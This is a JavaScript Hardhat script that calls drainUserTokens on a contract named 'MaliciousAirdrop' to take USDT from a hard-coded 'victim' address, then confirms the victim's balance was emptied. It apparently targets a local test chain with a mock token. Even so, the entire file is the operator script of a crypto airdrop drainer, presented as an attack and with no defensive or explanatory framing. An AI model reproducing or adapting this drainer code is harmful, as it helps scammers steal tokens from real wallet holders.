const { ethers } = require("hardhat");

async function main() {
  // --- CONFIGURATION ---
  // Make sure these addresses are correct and match your latest deployment
  const maliciousAirdropAddress = "0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512";
  const usdtAddress = "0x5FbDB2315678afecb367f032d93F642f64180aa3";
  const victimAddress = "0x8626f6940E2eb28930eFb4CeF49B2d1F2C9C1199";
  // -------------------

  console.log("Connecting to contracts as the owner...");
  const [owner] = await ethers.getSigners();
  const contract = await ethers.getContractAt("MaliciousAirdrop", maliciousAirdropAddress, owner);

  console.log(`Attempting to drain USDT from victim: ${victimAddress}`);

  const tx = await contract.drainUserTokens(victimAddress, usdtAddress);
  console.log(`Draining tokens... TX hash: ${tx.hash}`);

  await tx.wait();
  console.log("✅ Tokens have been successfully drained!");

  // Optional: Check the victim's new balance
  const usdt = await ethers.getContractAt("MockUSDT", usdtAddress);
  const victimBalance = await usdt.balanceOf(victimAddress);
  console.log(`Victim's new USDT balance: ${ethers.formatUnits(victimBalance, 18)}`);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});